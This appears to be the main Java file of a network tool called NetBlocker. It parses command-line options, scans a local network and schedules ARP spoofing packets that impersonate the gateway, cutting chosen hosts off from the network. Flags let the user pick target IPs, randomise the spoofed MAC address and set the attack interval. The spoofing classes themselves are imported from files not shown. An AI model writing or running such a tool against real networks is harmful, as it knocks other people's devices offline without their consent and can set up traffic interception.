package NetBlocker;


import NetBlocker.Listners.ListenArpReply;
import NetBlocker.Scanners.ScanNetwork;
import NetBlocker.Scanners.SendSpoofPackets;
import org.apache.commons.cli.*;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.Pcaps;
import org.pcap4j.util.MacAddress;

import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;


public class Main {

    private static InetAddress ipAddress;// this machine ip address
    private static MacAddress macAddress;//this machine mac address

    private static List<InetAddress> ipsToAttack;
    private static boolean allow;
    private static boolean randomMac;
    private static boolean loopback;
    private static int delay = 3;
    private static String network;
    private static Scanner scanner;
    private static Map<InetAddress, MacAddress> ipMap;

    public static InetAddress gatewayAddress;
    public static MacAddress gatewayMacAddress;

    private static ScheduledExecutorService sheduler;

    public static void main(String[] args) {

        try {
            scanner = new Scanner(System.in);
            Options options = new Options();
            addOptions(options);
            CommandLineParser parser = new DefaultParser();
            CommandLine cmd = parser.parse(options, args);
            if (checkAndShowForHelp(cmd, options)) {
                return;
            }
            checkOptions(cmd);
            ipMap = new ConcurrentHashMap<>();
            switchOffLogging();
            PcapNetworkInterface nif = Pcaps.getDevByAddress(ipAddress);

            int snapLen = 65536;
            PcapNetworkInterface.PromiscuousMode mode = PcapNetworkInterface.PromiscuousMode.PROMISCUOUS;
            int timeout = 10;
            PcapHandle sendnHandle = nif.openLive(snapLen, mode, timeout);
            PcapHandle receiveHandle = nif.openLive(snapLen, mode, timeout);
            sheduler = Executors.newScheduledThreadPool(3);
            sheduler.scheduleAtFixedRate(new ScanNetwork(network, ipsToAttack, allow, sendnHandle, macAddress, ipAddress, gatewayAddress), 0, 5, TimeUnit.MINUTES);
            sheduler.scheduleWithFixedDelay(new SendSpoofPackets(sendnHandle, ipMap, macAddress, randomMac, gatewayAddress, loopback, ipAddress), 0, delay, TimeUnit.SECONDS);
            System.out.println("ignore the top lines about SLF4J");
            System.out.println("running");
            new ListenArpReply(ipsToAttack, ipMap, receiveHandle, allow).run();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void switchOffLogging() {

        //todo; have to find a way

    }

    private static boolean checkAndShowForHelp(CommandLine cmd, Options options) {
        if (cmd.hasOption("h")) {
            HelpFormatter formatter = new HelpFormatter();
            formatter.printHelp("ant", options);
            return true;
        }
        return false;
    }

    private static void checkOptions(CommandLine cmd) throws Exception {
        if (cmd.hasOption("n")) {
            String string = cmd.getOptionValue("n");
            if (string == null) {
                throw new MissingArgumentException("network not entered");
            } else {
                network = string;
            }
        } else {
            System.out.println("enter the network");
            network = scanner.nextLine();
        }
        if (cmd.hasOption("a") || cmd.hasOption("b")) {
            allow = cmd.hasOption("a");
        } else {
            throw new MissingArgumentException("need option -a or -b");
        }
        if (cmd.hasOption("ip")) {
            String ip = cmd.getOptionValue("ip").trim();
            ipAddress = InetAddress.getByName(ip);
        } else {
            ipAddress = askForIp("enter machine ip address");
        }

        if (cmd.hasOption("mac")) {
            String mac = cmd.getOptionValue("mac").trim();
            macAddress = MacAddress.getByName(mac);
        } else {
            macAddress = askForMac("enter mac address of the machine to check use ipconfig /all in windows and ifconfig in linux (seperator :)");
        }

        if (cmd.hasOption("bip")) {
            gatewayAddress = InetAddress.getByName(cmd.getOptionValue("bip"));
        } else {
            gatewayAddress = askForIp("enter ip to block for others(gateway ip)");
        }


        if (cmd.hasOption("ips")) {
            String ips = cmd.getOptionValue("ips");
            addIps(ips);
        } else {
            System.out.println("enter ips comma separated");
            String ips = scanner.nextLine();
            addIps(ips);
        }
        randomMac = cmd.hasOption("rmac");
        loopback = cmd.hasOption("l");
        if (cmd.hasOption("d")) {
            delay = Integer.parseInt(cmd.getOptionValue("d"));
        }


    }

    private static void addIps(String next) throws Exception {
        ipsToAttack = new ArrayList<>();
        if (next != null) {
            String[] ips = next.split(",");
            for (int i = 0; i < ips.length; i++) {
                InetAddress address = InetAddress.getByName(ips[i]);
                ipsToAttack.add(address);
            }
        }
        if (allow) {
            ipsToAttack.add(gatewayAddress);
            ipsToAttack.add(ipAddress);
        }
    }

    private static MacAddress askForMac(String message) {
        System.out.println(message);
        String mac = scanner.nextLine().trim();
        return MacAddress.getByName(mac);
    }

    private static InetAddress askForIp(String message) throws Exception {
        System.out.println(message);
        String ip = scanner.nextLine().trim();
        return InetAddress.getByName(ip);
    }

    private static void addOptions(Options options) {
        options.addOption("ip", true, "machine ip address");
        options.addOption("mac", true, "machine mac address (separator :)");
        options.addOption("bip", true, "ip to block for others(gateway address)");
        options.addOption("n", true, "network  ie 192.168.1 or 110 or 160.5 ie the network classes");
        options.addOption("a", "ips to exclude the attack, leave -ips list blank or when ips asked hit enter to block all (required this or -b)");
        options.addOption("b", "ips to block (required this or -a)");
        options.addOption("ips", true, "ips to attack comma separated");
        options.addOption("rmac", "randomizes the source mac default this machine mac address");
        options.addOption("l", "loopback to fix this machine if this mac gets blocked (experimental)");
        options.addOption("d", true, "delay between the attacks default 2 seconds (optional)");
        options.addOption("h", "help");
    }
}

